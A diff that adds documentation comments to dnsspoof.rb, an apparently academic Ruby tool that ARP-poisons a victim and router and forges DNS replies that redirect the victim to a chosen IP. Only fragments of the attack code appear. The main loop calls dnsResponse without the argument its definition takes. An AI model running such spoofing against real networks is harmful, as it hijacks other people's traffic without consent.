@@ -3,6 +3,7 @@ require 'rubygems'
 require 'packetfu'
 require 'thread'
 
+# Print usage of DNS Spoofing Application
 unless (ARGV.size == 2 || ARGV.size==3)
 	puts "Usage: ruby #{$0} Interface Victim-IP [Spoofer Web IP]"
 	puts "Example: ruby #{$0} em1 192.168.0.2"
@@ -10,7 +11,46 @@ unless (ARGV.size == 2 || ARGV.size==3)
 	exit
 end
 
+# ------------------------------------------------------------------------------------------------------------------
+# -- SOURCE FILE: dnsspoof.rb
+# -- 
+# -- FUNCTIONS: def init(intface, victimIP)
+# --		def revertArpPackets() 
+# --		def spoofThread(arp_packet_victim, arp_packet_router)
+# --		def getDomain(payload)
+# -- 		def dnsResponse(spoofIP)
+# --
+# --
+# -- DATE: 2014/11/02
+# -- 
+# -- REVISIONS: (Date and Description)
+# -- 
+# -- DESIGNER: Luke Tao, Ian Lee
+# -- 
+# -- PROGRAMMER: Luke Tao, Ian Lee
+# -- 
+# -- NOTES: These functions serves as the fundamental basis for the DNS Spoofing Application.
+# -------------------------------------------------------------------------------------------------------------------
 
+# --------------------------------------------------------------------------------------------------------------------
+# -- FUNCTION: init
+# -- 
+# -- DATE: 2014/11/02
+# -- 
+# -- REVISIONS: (Date and Description)
+# -- 
+# -- DESIGNER: Luke Tao, Ian Lee
+# -- 
+# -- PROGRAMMER: Luke Tao, Ian Lee
+# -- 
+# -- INTERFACE: def init(intface, victimIP)
+# -- 
+# -- RETURNS: void.
+# -- 
+# -- NOTES: This function sets up the network interface, as well as setting up the Attacker, Victim and Router's IP and
+# --        their respective MAC addresses in order to start the DNS Spoofing Session. In addition, this function
+# --	    enables IP forwarding and append the necessary firewall rules in order to drop legitimate DNS Response Packets.
+# ----------------------------------------------------------------------------------------------------------------------
 def init(intface, victimIP)
 
 	@interface = intface
@@ -49,6 +89,24 @@ def init(intface, victimIP)
 
 end
 
+# --------------------------------------------------------------------------------------------------------------------
+# -- FUNCTION: revertArpPackets
+# -- 
+# -- DATE: 2014/11/02
+# -- 
+# -- REVISIONS: (Date and Description)
+# -- 
+# -- DESIGNER: Luke Tao, Ian Lee
+# -- 
+# -- PROGRAMMER: Luke Tao, Ian Lee
+# -- 
+# -- INTERFACE: def revertArpPackets()
+# -- 
+# -- RETURNS: void.
+# -- 
+# -- NOTES: After the DNS Spoofing Session is done, this function is called on interrupt and it will send the proper
+# -- 	    ARP packets to the victim and the router in order to realign the ARP tables.
+# ----------------------------------------------------------------------------------------------------------------------
 def revertArpPackets()
 	
 	#Construct the target's packet
@@ -77,6 +135,24 @@ def revertArpPackets()
 	
 end
 
+# --------------------------------------------------------------------------------------------------------------------
+# -- FUNCTION: spoofThread
+# -- 
+# -- DATE: 2014/11/02
+# -- 
+# -- REVISIONS: (Date and Description)
+# -- 
+# -- DESIGNER: Luke Tao, Ian Lee
+# -- 
+# -- PROGRAMMER: Luke Tao, Ian Lee
+# -- 
+# -- INTERFACE: def spoofThread(arp_packet_victim, arp_packet_router)
+# -- 
+# -- RETURNS: void.
+# -- 
+# -- NOTES: This thread is being initialized so that the ARP packets are consistently sending to the victim and router
+# --	    in order for the DNS spoofing to work properly.
+# ----------------------------------------------------------------------------------------------------------------------
 def spoofThread(arp_packet_victim, arp_packet_router)
 
 	caught=false
@@ -87,6 +163,24 @@ def spoofThread(arp_packet_victim, arp_packet_router)
 	end
 end
 
+# --------------------------------------------------------------------------------------------------------------------
+# -- FUNCTION: getDomain
+# -- 
+# -- DATE: 2014/11/02
+# -- 
+# -- REVISIONS: (Date and Description)
+# -- 
+# -- DESIGNER: Luke Tao, Ian Lee
+# -- 
+# -- PROGRAMMER: Luke Tao, Ian Lee
+# -- 
+# -- INTERFACE: def getDomain(payload)
+# -- 
+# -- RETURNS: Domain Name String
+# -- 
+# -- NOTES: Once a DNS Query packet has been captured, this function is being called to parse out the domain name
+# --	    and return the domain name string.
+# ----------------------------------------------------------------------------------------------------------------------
 def getDomain(payload)
 	domainName = ""
 	
@@ -109,6 +203,25 @@ def getDomain(payload)
 	puts "Domain Info: " + domainName
 end
 
+# --------------------------------------------------------------------------------------------------------------------
+# -- FUNCTION: dnsResponse
+# -- 
+# -- DATE: 2014/11/02
+# -- 
+# -- REVISIONS: (Date and Description)
+# -- 
+# -- DESIGNER: Luke Tao, Ian Lee
+# -- 
+# -- PROGRAMMER: Luke Tao, Ian Lee
+# -- 
+# -- INTERFACE: def dnsResponse(spoofIP)
+# -- 
+# -- RETURNS: void.
+# -- 
+# -- NOTES: Once a packet has been captured and a domain name is verified, this function is called to create a DNS
+# --	    response packet, append multiple payloads such as the Transaction ID, Domain Name, Spoofed IP, etc. and send
+# --	    the response packet to the victim. 
+# ----------------------------------------------------------------------------------------------------------------------
 def dnsResponse(spoofIP)
 	udp_packet = PacketFu::UDPPacket.new(:config => @srcMAC, 
 					     :udp_src => @packet.udp_dst, 
@@ -154,22 +267,41 @@ def dnsResponse(spoofIP)
 
 end
 
+# --------------------------------------------------------------------------------------------------------------------
+# -- FUNCTION: Main
+# -- 
+# -- DATE: 2014/11/02
+# -- 
+# -- REVISIONS: (Date and Description)
+# -- 
+# -- DESIGNER: Luke Tao, Ian Lee
+# -- 
+# -- PROGRAMMER: Luke Tao, Ian Lee
+# -- 
+# -- INTERFACE: N/A
+# -- 
+# -- RETURNS: void.
+# -- 
+# -- NOTES: Main entry into script that takes command line arguments and starts the DNS Spoofing by capturing packets.
+# ----------------------------------------------------------------------------------------------------------------------
 begin
 
+	# Parse Network Interface and Victim IP command line arguments
 	intface = ARGV[0]
 	victIP = ARGV[1]
 	
-	if( ARGV.size ==3)
+	# Set Spoof IP from command line. Otherwise, set to default IP.
+	if(ARGV.size == 3)
 		spoofIP = ARGV[2]
 	else
-		spoofIP = "199.59.150.39" # Twitter IP
+		spoofIP = "199.59.150.39" # Default Twitter IP
 	end
 
 	puts "Victim IP: " + victIP
 	puts "Interface: " + intface
 	puts "Spoofed to: " + spoofIP
 
-
+	# Initialize Network Interface and Victim's IP
 	init(intface, victIP)
 
 
@@ -177,11 +309,12 @@ begin
 	puts "Dest MAC: " + @victimMAC.to_s
 	puts "Router's MAC: " + @routerMAC.to_s
 
+	# Spawn ARP Poisoning Thread
 	puts "Initiating ARP thread..."
 	arp_spoof_thread = Thread.new{spoofThread(@arp_packet_target, @arp_packet_router)}
 
 
-
+	# Initialize DNS Query Capture
 	capture = PacketFu::Capture.new(:iface => @interface, 
 					:start => true, 
 					:promisc => true, 
@@ -192,6 +325,7 @@ begin
 	capture.stream.each do |packet|
 		puts "Captured packet"
 
+		# Parse Packet and Get Domain Name from Packet
 		@packet = PacketFu::Packet.parse(packet)
 		@domain = getDomain(@packet.payload[12..-1])
 		if @domain.nil?
@@ -199,6 +333,8 @@ begin
 			next
 		end
 		puts "DNS Query for: " + @domain
+
+		# Send DNS Response back
 		dnsResponse
 	end
 	arp_spoof_thread.join
